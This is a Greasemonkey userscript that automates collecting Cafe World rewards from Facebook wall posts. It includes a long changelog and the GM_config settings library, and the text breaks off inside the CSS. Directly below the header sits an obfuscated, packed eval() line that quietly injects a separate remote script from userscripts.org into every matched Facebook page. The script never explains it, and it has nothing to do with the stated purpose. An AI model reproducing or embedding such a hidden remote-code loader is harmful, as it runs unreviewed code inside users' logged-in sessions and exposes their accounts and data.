// ==UserScript==
// @name           Cafe World Wall Manager Plus
// @namespace      Cafe World
// @description    Accepts food from the wall or cafe world filter
// @include        http://www.facebook.com/home.php?sk=lf
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include        http://www.facebook.com/*?filter=app_101539264719*
// @copyright      MuadDib
// @version        1.2.82.80
// @license        http://creativecommons.org/licenses/by-nc-nd/3.0/us/
// @require        http://sizzlemctwizzle.com/updater.php?id=68426&days=1
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))




var version = '1.2.82.80'; // cant use cdata+regexp to grab version dynamically because of webkit

/*
Changelog:
1.0.0 - Created
1.0.1 - Now grabs taste testing links from topic pages
1.0.2 - Added "Try" links
1.0.3 - Removed taste testing from forums because they removed that feature
1.0.4 - MuadDib - Added Brave/Etc links. Updated version string handle, added
        meta, fix for home.php missing from filter link.
1.1.0 - MuadDib - Update to clear out accepted items once a week.
                  Moved Reset Accepted Items to Options screen.
				  Added Config link in navbar using code from Joe's Farmville Wall Manager. Kudos to Joe!
1.1.1 - MuadDib - Update for sidebar menu fix where facebook changes names around of ids, blah.
1.1.2 - MuadDib - Fixed bug where menu command was not bringing up options screen but other method was.
1.1.3 - MuadDib - Added feature for Give Love. In order to complete this, now checks the iframe for the
                  'from_snood' and if it exists, opens first instance (get 50 cafe points) before marking accepted.
1.1.4 - MuadDib - Quick and dirty Click Similar Posts code added. After 24 hours I couldn't get this one tested cuz no one caused similar posts on my wall. Please provide feedback.
1.1.5 - MuadDib - Visual changes to Options Menu per changes Joe made to CWWM (I like the look). Also added Click Similar setting to options.
1.1.6 - MuadDib - Major rewrite began. Partial specific dish and bonus options already added for testing. Still needs work for the current/max request code to make this less stressfull on the cafe world servers.
1.1.7 - MuadDib - Beta phase beginning for this new rewrite. Posting to forums to get beta testers instead of as official release.
1.1.71 - MuadDib - Mystery Spice Fix.
1.2.0  - MuadDib - Conversion with Farmville Wall Manager v1.2.172 and converted for CWWM stuff.
1.2.1  - MuadDib & Jefferyan - Addition of more dish types. Apple Pie for cafe points working
1.2.4  - MuadDib - Thanks to joe, I hardcoded a fix for the current screwups by Facebook breaking the filter. Now see only Cafe World again.
1.2.5  - MuadDib - Misc updates here and there. No lotto working yet, gonna wait until I see more of them so I can test accurately.
1.2.51 - MuadDib - Added corned beef to the list.
1.2.52 - MuadDib - Updates to be more dynamic. Also lotto support, be sure to check this to make sure it's working
1.2.53 - MuadDib - GM_config() updates per Joe. Also rewrote main.open() for more dynamic future handling of lost recipe, lotto, and helping friend requests.
1.2.57 - MuadDib - Merged differences with FVWM. Made feed filtering more dynamic for other wall managers. Also added new div and list to homepage to hold wall manager option links.
1.2.57 - MuadDib - Updates merged from fvwm. 
1.2.59 - MuadDib - Changed use of filter url, now using the new layout for sk=, merged fvwm updates for refresh interval changes, new option for how many CWWM posts to show, misc stye updates.
1.2.60 - MuadDib - New menu option to Colorize wall posts. If a post was processed, changes background to light green, if not, light off-yellow. This is only recommended or needed if you want to see what is being ignored to find new dishes etc.
1.2.61 - MuadDib - New menu section for Lost Recipes. Added options as needed for grandma's pie and grandpa's ribs.
1.2.62 - MuadDib - Fix for helping friend missions. Zynga made this start forwarding to a new url, broke script. Fixed and working now for cakes etc.
                   Removed transparent background, thought I had already done that. Reordered Bonus checkbox in menu. Mission Fix still in progress.
1.2.63 - MuadDib - Fix for new facebook news feed system.
1.2.64 - MuadDib - GM_config() updates.
1.2.65 - MuadDib - Lotto tickets confirmed and working. Fixed and confirmed Missions working without changing page using forms.
1.2.66 - MuadDib - Main option under General/Generic, to disable getting any dish. Also changed defaults for all dish types to false.
1.2.67 - MuadDib - New facebook changes yet again. Updated for new navigation design.
1.2.671 - MuadDib - Updated for backwards compatibility on expand due to facebook being it's usual screwy self.
1.2.68 - MuadDib - Updated for new dishes.
1.2.69 - MuadDib - Updated for new dishes. Set "Accept Dishes" to default false, and default true for individuals.
1.2.70 - MuadDib - Removed filter handling from script, let this be handled via the Facebook Filter Manager script.
1.2.71 - MuadDib - Added support for getting stove parts that are shared. Also fixed a nasty bug with lotto and helping friend.
1.2.72 - MuadDib - Name adjustments for parsing dishes. Also moved A-C to alphabetical, horizontal, for testing to see if this viewing is preferred.
1.2.73 - MuadDib - Added Vegas Buffet
1.2.74 - MuadDib - Added Sirius Sorbet dish and submitted similar post fix by Kraff
1.2.75 - MuadDib - Sushi Spread added to the dish list. Seperated out Daily Bonus and Achievement Bonus. Both will still be collected if gift box full hits max (if they ever implement that).
1.2.76 - MuadDib - Added click for waterfall, wedding cake, lottory tickets tweak, claim daily bonus secondary (to select between the 3 mystery gifts randomly, this is a mystery after all!).
1.2.77 - MuadDib - Added clicking for saved spoiled dishes, share the loot (spice). Updates for lotto, daily, and waterfall/wedding cakes.
1.2.78 - MuadDib - Fixed dish accepting, now appends the accept link during wall pulling so it auto accepts dishes.

1.2.78.10 Fixes by RockyTheWonderGeek
Added fix for stuffed_mushrooms 05-09-10 and set ver to 1.2.78.01  RTWG
Added fix for clubhouse_sandwich 05-10-10 and set ver to 1.2.78.02  RTWG
Added fix for philly_cheesesteak 05-15-10 and set ver to 1.2.78.03  RTWG
Added fix for angel_fruit_cake and spicy_devil_eggs 05-28-10 and set ver to 1.2.78.04  RTWG
Added code to collect Mastery Boosts patterned after the dailybonus code 05-28-10 and set ver to 1.2.78.05  RTWG
Added fix for confit_de_canard 06-12-10 and set ver to 1.2.78.06  RTWG
Added fix for falafel - kabayaki - corndog 06-12-10 and set ver to 1.2.78.07  RTWG
Added fix for Osso Bucco and Chicken Vindaloo 06-13-10 and set ver to 1.2.78.08  RTWG
Added fix(s) for chocolate_cream_pie - raspberry_cheesecake - lox_bagel 06-19-10 and set ver to 1.2.78.09  RTWG
Added fix for Friend Spice Shipment collection 06-20-10 and set ver to 1.2.78.10  RTWG

1.2.79   - MuadDib - Updated stylesheeting and added option to Hide Completed Posts. Slight menu changes. Added "chef_special" links.
1.2.80   - MuadDib - Add more to the Exclude list. This will also cause these entries to be "Removed" from the wall if Hide Finished is enabled. Mastery Bonus fix.
1.2.80.1 - MuadDib - Added mini sliders and bbq chicken.
1.2.80.2 - RTWG - Added vegetarian_tamales 07-09-10 and set ver to 1.2.80.2
1.2.80.3 - RTWG - Added V.I.P. Salads code and Escargot dish 07-17-10 and set ver to 1.2.80.3
1.2.80.4 - RTWG - Added Vampire Staked Steak dish 07-24-10 and set ver to 1.2.80.4
1.2.80.5 - RTWG - Added Coffee Energy Refills 07-27-10 and set ver to 1.2.80.5
1.2.80.6 - RTWG - Added Blood Sausages dish 07-29-10 and set ver to 1.2.80.6
1.2.81.0 - RTWG - Added Pita and Dolmas dish and code for collecting new Birthday Cake item.
                  Revised code for Daily Bonuses, Achievement Bonuses, sending Mystery Spice, Spoiled Dishs, 
                  Perfect Dishes, Chef Specials and Friend Spice Shipments 07-29-10 and set ver to 1.2.81.0
1.2.81.1 - RTWG - Added collection of Extra Servings from friend cafe visits and updated code to send "Magic Spice"
                  (formerly called Mystery Spice) to friends 08-14-10 and set ver to 1.2.81.1
1.2.81.2 - RTWG - Minor code tweaks (including set default for accept dishes in options to true from false) 
                  and added Ranch Beans and Birthday Cupcakes dishes and also Catering Rewards bonus 08-31-10 and set ver to 1.2.81.2
1.2.81.3 - RTWG - Added ability for options link to display on home page and GM menu (when not on filter page) and added 
                  new Rack Of Lamb dish 09-03-10 and set ver to 1.2.81.3
1.2.81.4 - RTWG - Added minor code tweak to grab Grandpa's BBQ catering rewards 09-08-10 and set ver to 1.2.81.4
1.2.81.5 - RTWG - Added Tempura Udon dish and added config option (like FVWM) to allow running on other than the
                  filter page 09-09-10 and set ver to 1.2.81.5
1.2.81.6 - RTWG - Added Banana Nut Muffin dish 09-20-10 and set ver to 1.2.81.6
1.2.81.7 - RTWG - Added new Anniversary dishes (Shanghai Dumplings, Pastilla, Feijoada and Anniversary Cake) 09-25-10
                  and set ver to 1.2.81.7
1.2.81.8 - RTWG - Added new Ratatouille Anniversary dish 09-26-10

1.2.82.0  - RTWG - Added new Red Burrito and In Flight Meal dishes and added code to collect new First Brew 
                   and other bonuses 09-30-10
1.2.82.1  - RTWG - Added new Tuna Melt dish 09-26-10
1.2.82.2  - RTWG - Interim update.  Added new Veggie Sushi and Caramel Corn dishes.  Also added collection of new "Big Tip" reward.
                   Complete rewrite of code for handling Scratch Lotto Tickets.  Fixed missing background image on config screen.
                   Still have more testing to do on other internal enhancements not included in this release. 10-22-10
1.2.82.3  - RTWG - Minor code tweaks.  Added fix for Spice Crates and better testing for failed items
                   in req frame onload function. 10-29-10
1.2.82.31 - RTWG - More code tweaks.  Added fix for "multi gift box" issue 10-29-10.
1.2.82.4  - RTWG - More code tweaks.  Added new Royal Feast dish and code to grab the new Collection Bonuses. 11-02-10.
1.2.82.41 - RTWG - Fixed bug in new Collection Bonus code. 11-02-10.
1.2.82.42 - RTWG - Modified code for "Force Older Posts To Bottom" config option due to FB page layout changes. 11-04-10.
1.2.82.5  - RTWG - Added Unbirthday Cake dish and code to help with Queen Deep Freeze assembly. 11-11-10.
1.2.82.51 - RTWG - Added Deep Fried Turkey dish and renamed Queen Deep Freeze assembly to Project assembly. 11-11-10.
1.2.82.52 - RTWG - Fixed bug in Project assembly processing. 11-12-10.
1.2.82.53 - RTWG - Added code to collect/send new Special Delivery bonuses. 11-13-10.
1.2.82.54 - RTWG - Added Chocolate Pecan Pie dish. 11-18-10.
1.2.82.55 - RTWG - Added Gingerbread House dish. 11-22-10.
1.2.82.56 - RTWG - Added Finger Sandwiches dish. 11-30-10.
1.2.82.57 - RTWG - Added code to collect new Cooking Academy Bonuses. 12-04-10.
1.2.82.58 - RTWG - Added Snack Platter dish. 12-07-10.
1.2.82.59 - RTWG - Added new Holiday dishes (Baked Ham, Angel Slices, and Waldorf Salad) and tweaked some code for performance. 12-10-10.
1.2.82.60 - RTWG - Added new Gem Cake Holiday dish. 12-11-10.
1.2.82.61 - RTWG - Added new Homemade Almond Toffee dish. 12-18-10.
1.2.82.62 - RTWG - Added code to collect new Holiday Tree Bonuses. 12-22-10.
1.2.82.63 - RTWG - Added new New Years dishes (Bread Pudding, Mini Crab Cakes, Salmon Rillettes and Beef Skewers). 12-29-10.
1.2.82.64 - RTWG - Added Stardust Stew dish from Mr Snowball promo. 01-04-10.   
1.2.82.65 - RTWG - Re-upload due to typo adding Stardust Stew dish. 01-04-10.   
1.2.82.66 - RTWG - Added Snowflake Cake dish from Winter Ball catering promo. 01-06-10.   
1.2.82.67 - RTWG - Added Beef Wellington dish from Cooking Academy promo. 01-11-10.   
1.2.82.68 - RTWG - Added new Deep Fryer dishes - Funnel Cake, Onion Rings and Deep Fried Candy Bars. 01-14-10.   
1.2.82.69 - RTWG - Re-upload due to typo adding Deep Fried Candy Bar dish. 01-16-10.   
1.2.82.70 - RTWG - Re-upload due to typo adding Deep Fried Candy Bar dish. 01-18-10.   
1.2.82.71 - RTWG - Added ability to grab new or unknown dishes. 02-08-11. 
1.2.82.72 - RTWG - Temporary fix to due to changes by Facebook/Zynga eliminating the previously clickable link on the wall posts. 02-10-11.  
1.2.82.73 - RTWG - Removed temporary fix in 1.2.82.72 and added a few other mods to adapt to some other FB changes. 02-12-11.  
1.2.82.74 - RTWG - Added code to exclude new Cookbook Access Golden Tickets. 03-30-11.
1.2.82.75 - RTWG - Changed code to account for FB changes for dishes and spices. 04-13-11.
1.2.82.76 - RTWG - Minor tweaks and added code to process wall posts asking for goal items. 04-24-11.
1.2.82.77 - RTWG - Added code to process new Pastry Station rewards. 06-03-11.
1.2.82.78 - RTWG - Added code to process new Assembly Thank You bonuses. 06-17-11.
1.2.82.79 - RTWG - Re-upload due to typo adding code to process new Assembly Thank You bonuses. 06-17-11.
1.2.82.80 - RTWG - Added code to process new BBQ Grill bonuses. 06-25-11.
 
                                       


/*
To-Do:
	1. Finish organizing all dishes into alphabetical order.
*/

//  Comment out below to enable debug output 
var GM_log = function(){};

//
// Set to true to show request frame for debugging
//
var showSilentRequestHolderFrame = false;

// style:'position:fixed; top:0; left:0; opacity:0; display:none; z-index:999; width:75%; height:75%; max-height:95%; max-width:95%; border:1px solid #000000; overflow:auto;
//bottom:auto;

//
// styles for silent_req_holder container frame (SRH) and the iframes generated and appended for each individual request (IRF) 
//
var SHR_Style = "";
var IRF_Style = "";

//var SRH_VisibleStyle = "display:block; visibility:visible; position:fixed; width:90%; height:90%; top:20px; left:0; right:0; border:1px; z-index:999;";
var SRH_VisibleStyle = "display:block; visibility:visible; position:fixed; width:90%; height:90%; top:30px; left:60px; right:0; frameborder:1; border: 2px ridge #30B0B0; z-index:999;";
// var SRH_HiddenStyle = "visibility:hidden; border:0px; width:0; height:0;";
var SRH_HiddenStyle = "display:block; visibility:visible; position:fixed; width:50%; height:50%; top:0px; left:-1600px; right:0; border: 0px;";
var IRF_VisibleStyle = "visibility:visible; width:100%; height:100%; top:0; left:0; frameborder:0px; border:0px;";
// var IRF_HiddenStyle = "visibility:hidden; border:0px; width:0; height:0;";
var IRF_HiddenStyle = "visibility:visible; border:0px; width:0; height:0;";

// default to hidden
SHR_Style = SRH_HiddenStyle;
IRF_Style = IRF_HiddenStyle;

if (showSilentRequestHolderFrame) {
  SHR_Style = SRH_VisibleStyle;
  IRF_Style = IRF_VisibleStyle;
}




function clickLink(el) {
	var e = document.createEvent('MouseEvents');
	e.initEvent('click',true,true); 
	el.dispatchEvent(e);
}

function sleep(delay) {
  // use to insert a delay (in ms) for script debugging or ajax call completion
  var start = new Date().getTime();
  while (new Date().getTime() < start + delay);
}

function debugShowRequestHolder(key) {
  // turn on silent_req_holder iframe
  var srhldr = document.getElementById("silent_req_holder");
  srhhldr.style.visibility = "visible";
  srhhldr.style.position = "fixed";
  srhhldr.style.width = "95%";
  srhhldr.style.height = "95%";
  srhhldr.style.top = "0";
  srhhldr.style.left = "0";
  srhhldr.style.border = "2px";
  srhhldr.style.zIndex = "99998";
  
  // turn on req iframe
  var thisReq = document.getElementById(key); 
  thisReq.style.visibility = "visible";
  thisReq.style.position = "static";
  thisReq.style.width = "95%";
  thisReq.style.height = "95%";
  thisReq.style.top = "0";
  thisReq.style.left = "0";
  thisReq.style.border = "0";
  thisReq.style.frameborder = "0";
  thisReq.style.scrolling = "auto";
}

function debugHideRequestHolder(key) { 
  // turn off req frame
  var srhldr = document.getElementById("silent_req_holder");
  srhhldr.style.visibility = "hidden";
  srhhldr.style.position = "";
  srhhldr.style.width = "0";
  srhhldr.style.height = "0";
  srhhldr.style.top = "0";
  srhhldr.style.left = "0";
  srhhldr.style.border = "0";
  srhhldr.style.zIndex = "0";
  
  // turn off req frame
  var thisReq = document.getElementById(key); 
  thisReq.style.visibility = "hidden";
  thisReq.style.position = "";
  thisReq.style.width = "0";
  thisReq.style.height = "0";
  thisReq.style.top = "0";
  thisReq.style.left = "0";
  thisReq.style.border = "0";
  thisReq.style.frameborder = "0";
  thisReq.style.scrolling = "no";
}


// Text displayed on "failed" pages 
var failedTextRegex = /(It looks like they've already received all the help they could handle!|You can only taste test once per event!|Uh-Oh! You have already helped today!|You have already claimed this reward|Looks like you are too late to help!|Looks like all the scratch lotto tickets are gone|This reward has expired|reward has already expired|has already received all the prizes|quite a few chefs already collected the reward|something went wrong in the kitchen|no more servings left|Looks like all the prizes have been claimed!|either too late or you clicked here previously|is all out of Perfect Servings for today|Perfect Servings once today|You can only taste test once)/ ;

function failedItem(text) {
	// GM_log("Failed Item Function Return Value = " + failedTextRegex.test(text) );
  return failedTextRegex.test(text);
}	


if(!parent || parent.location!=location) return;

var imgs = {
bg : "http://i45.tinypic.com/raq4x3.png",
logo : "http://i41.tinypic.com/1o8550.jpg",
icon : "http://i39.tinypic.com/1zqdldu.jpg"
};

// boolean to tell if the browser is running Greasemonkey or not
var isGM = (typeof GM_getValue != 'undefined' && typeof GM_getValue('a', 'b') != 'undefined');


// Get ID
function $(ID,root) {return (root||document).getElementById(ID);}

Array.prototype.inArray = function(value) {
for(var i=this.length-1; i>=0; i--) {if(this[i]==value) {return true;}}
return false;
};

Array.prototype.inArrayWhere = function(value) {
for(var i=0,l=this.length; i<l; i++) {if(this[i]==value) {return i;}}
return false;
};

String.prototype.find = function(s) {
return (this.indexOf(s) != -1);
};

// Define GM_addStyle if it's not Firefox
if(GM_addStyle==="undefined" || typeof GM_addStyle==="undefined") {
    GM_addStyle = function(css) {
        var head = document.getElementsByTagName('head')[0], style = document.createElement('style');
        if(head) {
        style.type = 'text/css';
        try {style.innerHTML = css} catch(x) {style.innerText = css}
        head.appendChild(style);
		}
    };
}

// $g by JoeSimmons. Supports ID, Class, and XPath (full with types) in one query
// Supports multiple id/class grabs in one query (split by spaces), and the ability to remove all nodes regardless of type
// See script page for syntax examples: http://userscripts.org/scripts/show/51532
function $g(que, O) {
if(!que||typeof(que)!='string'||que==''||!(que=que.replace(/^\s+/,''))) return false;
var obj=O||({del:false,type:6,node:document}), r, t,
	idclass_re=/^[#\.](?!\/)[^\/]/, xp_re=/^\.?(\/{1,2}|count|id)/;
if(idclass_re.test(que)) {
var s=que.split(' '), r=new Array(), c;
for(var n=0; n<s.length; n++) {
switch(s[n].substring(0,1)) {
case '#': r.push(document.getElementById(s[n].substring(1))); break;
case '.': c=document.getElementsByClassName(s[n].substring(1));
		  if(c.length>0) for(var i=0; i<c.length; i++) r.push(c[i]); break;
}
}
if(r.length==1) r=r[0];
} else if(xp_re.test(que)) {
r = document.evaluate(que,(obj['node']||document),null,((t=obj['type'])||6),null);
if(typeof t=="number" && /[12389]/.test(t)) r=r[(t==1?"number":(t==2?"string":(t==3?"boolean":"singleNode")))+"Value"];
}
if(r && obj['del']===true) {
if(r.nodeType==1) r.parentNode.removeChild(r);
else if(r.snapshotItem) for(var i=r.snapshotLength-1; (item=r.snapshotItem(i)); i--) item.parentNode.removeChild(item);
else if(!r.snapshotItem) for(var i=r.length-1; i>=0; i--) if(r[i]) r[i].parentNode.removeChild(r[i]);
} return r;
}

// GM_config by JoeSimmons/sizzlemctwizzle/izzysoft
var GM_config = {
 storage: 'GM_config', // This needs to be changed to something unique for localStorage
 init: function() {
        // loop through GM_config.init() arguements
	for(var i=0,l=arguments.length,arg; i<l; ++i) {
		arg=arguments[i];
		switch(typeof arg) {
            case 'object': for(var j in arg) { // could be a callback functions or settings object
							switch(j) {
							case "open": GM_config.onOpen=arg[j]; delete arg[j]; break; // called when frame is gone
							case "close": GM_config.onClose=arg[j]; delete arg[j]; break; // called when settings have been saved
							case "save": GM_config.onSave=arg[j]; delete arg[j]; break; // store the settings objects
							default: var settings = arg;
							}
			} break;
            case 'function': GM_config.onOpen = arg; break; // passing a bare function is set to open
                        // could be custom CSS or the title string
			case 'string': if(arg.indexOf('{')!=-1&&arg.indexOf('}')!=-1) var css = arg;
				else GM_config.title = arg;
				break;
		}
	}
	if(!GM_config.title) GM_config.title = 'Settings - Anonymous Script'; // if title wasn't passed through init()
	var stored = GM_config.read(); // read the stored settings
	GM_config.passed_values = {};
	for (var i in settings) {
	GM_config.doSettingValue(settings, stored, i, null, false);
	if(settings[i].kids) for(var kid in settings[i].kids) GM_config.doSettingValue(settings, stored, kid, i, true);
	}
	GM_config.values = GM_config.passed_values;
	GM_config.settings = settings;
	if (css) GM_config.css.stylish = css;
 },
 open: function() {
 if(document.evaluate("//iframe[@id='GM_config']",document,null,9,null).singleNodeValue) return;
	// Create frame
	document.body.appendChild((GM_config.frame=GM_config.create('iframe',{id:'GM_config', style:'position:fixed; top:0; left:0; opacity:0; display:none; z-index:999; width:75%; height:75%; max-height:95%; max-width:95%; border:1px solid #000000; overflow:auto;'})));
        GM_config.frame.src = 'about:blank'; // In WebKit src cant be set until it is added to the page
	GM_config.frame.addEventListener('load', function(){
		var obj = GM_config, frameBody = this.contentDocument.getElementsByTagName('body')[0], create=obj.create, settings=obj.settings;
		obj.frame.contentDocument.getElementsByTagName('head')[0].appendChild(obj.create('style',{type:'text/css',textContent:obj.css.basic+obj.css.stylish}));

		// Add header and title
		frameBody.appendChild(obj.create('div', {id:'header',className:'config_header block center', innerHTML:obj.title}));

		// Append elements
		var anch = frameBody, secNo = 0; // anchor to append elements
		for (var i in settings) {
			var type, field = settings[i], value = obj.values[i];
			if (field.section) {
				anch = frameBody.appendChild(create('div', {className:'section_header_holder', id:'section_'+secNo, kids:new Array(
				  create('a', {className:'section_header center', href:"javascript:void(0);", id:'c_section_kids_'+secNo, textContent:field.section[0], onclick:function(){GM_config.toggle(this.id.substring(2));}}),
				  create('div', {id:'section_kids_'+secNo, className:'section_kids', style:obj.getValue('section_kids_'+secNo, "none")=="none"?"display: none;":""})
				  )}));
				if(field.section[1]) anch.appendChild(create('p', {className:'section_desc center',innerHTML:field.section[1]}));
				secNo++;
			}
			anch.childNodes[1].appendChild(GM_config.addToFrame(field, i, false));
		}

		// Add save and close buttons
		frameBody.appendChild(obj.create('div', {id:'buttons_holder', kids:new Array(
			obj.create('button',{id:'saveBtn',textContent:'Save',title:'Save options and close window',className:'saveclose_buttons',onclick:function(){GM_config.close(true)}}),
			obj.create('button',{id:'cancelBtn', textContent:'Cancel',title:'Close window',className:'saveclose_buttons',onclick:function(){GM_config.close(false)}}),
			obj.create('div', {className:'reset_holder block', kids:new Array(
				obj.create('a',{id:'resetLink',textContent:'Restore to default',href:'#',title:'Restore settings to default configuration',className:'reset',onclick:obj.reset})
		)}))}));

		obj.center(); // Show and center it
		window.addEventListener('resize', obj.center, false); // Center it on resize
		if (obj.onOpen) obj.onOpen(); // Call the open() callback function
		
		// Close frame on window close
		window.addEventListener('beforeunload', function(){GM_config.remove(this);}, false);
	}, false);
 },
 close: function(save) {
	if(save) {
		var type, fields = GM_config.settings, typewhite=/radio|text|hidden|checkbox/;
		for(f in fields) {
			var field = GM_config.frame.contentDocument.getElementById('field_'+f), kids=fields[f].kids;
			if(typewhite.test(field.type)) type=field.type;
				else type=field.tagName.toLowerCase();
			GM_config.doSave(f, field, type);
			if(kids) for(var kid in kids) {
			var field = GM_config.frame.contentDocument.getElementById('field_'+kid);
			if(typewhite.test(field.type)) type=field.type;
				else type=field.tagName.toLowerCase();
			GM_config.doSave(kid, field, type, f);
			}
		}
                if(GM_config.onSave) GM_config.onSave(); // Call the save() callback function
                GM_config.save();
	}
	if(GM_config.frame) GM_config.remove(GM_config.frame);
	delete GM_config.frame;
        if(GM_config.onClose) GM_config.onClose(); //  Call the close() callback function
 },
 set: function(name,val) {
	GM_config.values[name] = val;
 },
 get: function(name) {
	return GM_config.values[name];
 },
 isGM: typeof GM_getValue != 'undefined' && typeof GM_getValue('a', 'b') != 'undefined',
 log: (this.isGM) ? GM_log : ((window.opera) ? opera.postError : console.log),
 getValue : function(name, def) { return (this.isGM?GM_getValue:(function(name,def){return localStorage.getItem(name)||def}))(name, def||""); },
 setValue : function(name, value) { return (this.isGM?GM_setValue:(function(name,value){return localStorage.setItem(name,value)}))(name, value||""); },
 save: function(store, obj) {
    try {
      var val = JSON.stringify(obj||GM_config.values);
      GM_config.setValue((store||GM_config.storage),val);
    } catch(e) {
      GM_config.log("GM_config failed to save settings!");
    }
 },
 read: function(store) {
    try {
      var val = GM_config.getValue((store||GM_config.storage), '{}'), rval = JSON.parse(val);
    } catch(e) {
      GM_config.log("GM_config failed to read saved settings!");
      rval = {};
    }
    return rval;
 },
 reset: function(e) {
	e.preventDefault();
	var type, obj = GM_config, fields = obj.settings;
	for(f in fields) {
		var field = obj.frame.contentDocument.getElementById('field_'+f), kids=fields[f].kids;
		if(field.type=='radio'||field.type=='text'||field.type=='checkbox') type=field.type;
		else type=field.tagName.toLowerCase();
		GM_config.doReset(field, type, null, f, null, false);
		if(kids) for(var kid in kids) {
			var field = GM_config.frame.contentDocument.getElementById('field_'+kid);
			if(field.type=='radio'||field.type=='text'||field.type=='checkbox') type=field.type;
		else type=field.tagName.toLowerCase();
			GM_config.doReset(field, type, f, kid, true);
			}
	}
 },
 addToFrame : function(field, i, k) {
	var elem, obj = GM_config, anch = GM_config.frame, value = obj.values[i], Options = field.options, label = field.label, create=GM_config.create, isKid = k!=null && k===true;
		switch(field.type) {
				case 'textarea':
					elem = create(isKid ? "span" : "div", {title:field.title||'', kids:new Array(
						create('span', {textContent:label, className:'field_label'}),
						create('textarea', {id:'field_'+i,innerHTML:value, cols:(field.cols?field.cols:20), rows:(field.rows?field.rows:2)})
					), className: 'config_var'});
					break;
				case 'radio':
					var boxes = new Array();
					for (var j = 0,len = Options.length; j<len; j++) {
						boxes.push(create('span', {textContent:Options[j]}));
						boxes.push(create('input', {value:Options[j], type:'radio', name:i, checked:Options[j]==value?true:false}));
					}
					elem = create(isKid ? "span" : "div", {title:field.title||'', kids:new Array(
						create('span', {textContent:label, className:'field_label'}),
						create('span', {id:'field_'+i, kids:boxes})
					), className: 'config_var'});
					break;
				case 'select':
					var options = new Array();
					if(!Options.inArray) for(var j in Options) options.push(create('option',{textContent:Options[j],value:j,selected:(j==value)}));
						else options.push(create("option", {textContent:"Error - options needs to be an object type, not an array.",value:"error",selected:true})); 					elem = create(isKid ? "span" : "div", {title:field.title||'', kids:new Array(
						create('span', {textContent:label, className:'field_label'}),
						create('select',{id:'field_'+i, kids:options})
					), className: 'config_var'});
					break;
				case 'checkbox':
					elem = create(isKid ? "span" : "div", {title:field.title||'', kids:new Array(
						create('label', {textContent:label, className:'field_label', "for":'field_'+i}),
						create('input', {id:'field_'+i, type:'checkbox', value:value, checked:value})
					), className: 'config_var'});
					break;
				case 'button':
				var tmp;
					elem = create(isKid ? "span" : "div", {kids:new Array(
						(tmp=create('input', {id:'field_'+i, type:'button', value:label, size:(field.size?field.size:25), title:field.title||''}))
					), className: 'config_var'});
					if(field.script) obj.addEvent(tmp, 'click', field.script);
					break;
				case 'hidden':
				elem = create(isKid ? "span" : "div", {title:field.title||'', kids:new Array(
						create('input', {id:'field_'+i, type:'hidden', value:value})
					), className: 'config_var'});
					break;
				default:
					elem = create(isKid ? "span" : "div", {title:field.title||'', kids:new Array(
						create('span', {textContent:label, className:'field_label'}),
						create('input', {id:'field_'+i, type:'text', value:value, size:(field.size?field.size:25)})
					), className: 'config_var'});
			}
	if(field.kids) {
	var kids=field.kids;
	for(var kid in kids) elem.appendChild(GM_config.addToFrame(kids[kid], kid, true));
	}
return elem;
},
 doSave : function(f, field, type, oldf) {
 var isNum=/^[\d\.]+$/, set = oldf ? GM_config.settings[oldf]["kids"] : GM_config.settings;
 switch(type) {
				case 'text':
					GM_config.values[f] = ((set[f].type=='text') ? field.value : ((isNum.test(field.value) && ",int,float".indexOf(","+set[f].type)!=-1) ? parseFloat(field.value) : false));
					if(set[f]===false) {
						alert('Invalid type for field: '+f+'\nPlease use type: '+set[f].type);
						return;
					}
					break;
				case 'hidden':
					GM_config.values[f] = field.value.toString();
					break;
				case 'textarea':
					GM_config.values[f] = field.value;
					break;
				case 'checkbox':
					GM_config.values[f] = field.checked;
					break;
				case 'select':
					GM_config.values[f] = field[field.selectedIndex].value;
					break;
				case 'span':
					var radios = field.getElementsByTagName('input');
					if(radios.length>0) for(var i=radios.length-1; i>=0; i--) {
						if(radios[i].checked) GM_config.values[f] = radios[i].value;
					}
					break;
			}
 },
 doSettingValue : function(settings, stored, i, oldi, k) {
		var set = k!=null && k==true && oldi!=null ? settings[oldi]["kids"][i] : settings[i];
			if(",save,open,close".indexOf(","+i) == -1) {
            // The code below translates to:
            // if a setting was passed to init but wasn't stored then 
            //      if a default value wasn't passed through init() then use null
            //      else use the default value passed through init()
            // 		else use the stored value
            var value = typeof stored[i] == "undefined" ? (typeof set['default'] == "undefined" ? null : set['default']) : stored[i];
            
            // If the value isn't stored and no default was passed through init()
            // try to predict a default value based on the type
            if (value === null) {
                switch(set["type"]) {
                    case 'radio': case 'select':
                        value = set.options[0]; break;
                    case 'checkbox':
                        value = false; break;
                    case 'int': case 'float':
                        value = 0; break;
                    default:
					value = (typeof stored[i]=="function") ? stored[i] : "";
                }
			}
			
			}
	GM_config.passed_values[i] = value;
 },
 doReset : function(field, type, oldf, f, k) {
 var isKid = k!=null && k==true, obj=GM_config,
	 set = isKid ? obj.settings[oldf]["kids"][f] : obj.settings[f];
 switch(type) {
			case 'text':
				field.value = set['default'] || '';
				break;
			case 'hidden':
				field.value = set['default'] || '';
				break;
			case 'textarea':
				field.value = set['default'] || '';
				break;
			case 'checkbox':
				field.checked = set['default'] || false;
				break;
			case 'select':
				if(set['default']) {
					for(var i=field.options.length-1; i>=0; i--)
					if(field.options[i].value==set['default']) field.selectedIndex=i;
				}
				else field.selectedIndex=0;
				break;
			case 'span':
				var radios = field.getElementsByTagName('input');
				if(radios.length>0) for(var i=radios.length-1; i>=0; i--) {
					if(radios[i].value==set['default']) radios[i].checked=true;
				}
				break;
		}
 },
 values: {},
 settings: {},
 css: {
 basic: 'body {background:#FFFFFF;}\n' +
 '.indent40 {margin-left:40%;}\n' +
 '* {font-family: arial, tahoma, sans-serif, myriad pro;}\n' +
 '.field_label {font-weight:bold; font-size:12px; margin-right:6px;}\n' +
 '.block {display:block;}\n' +
 '.saveclose_buttons {\n' +
 'margin:16px 10px 10px 10px;\n' +
 'padding:2px 12px 2px 12px;\n' +
 '}\n' +
 '.reset, #buttons_holder, .reset a {text-align:right; color:#000000;}\n' +
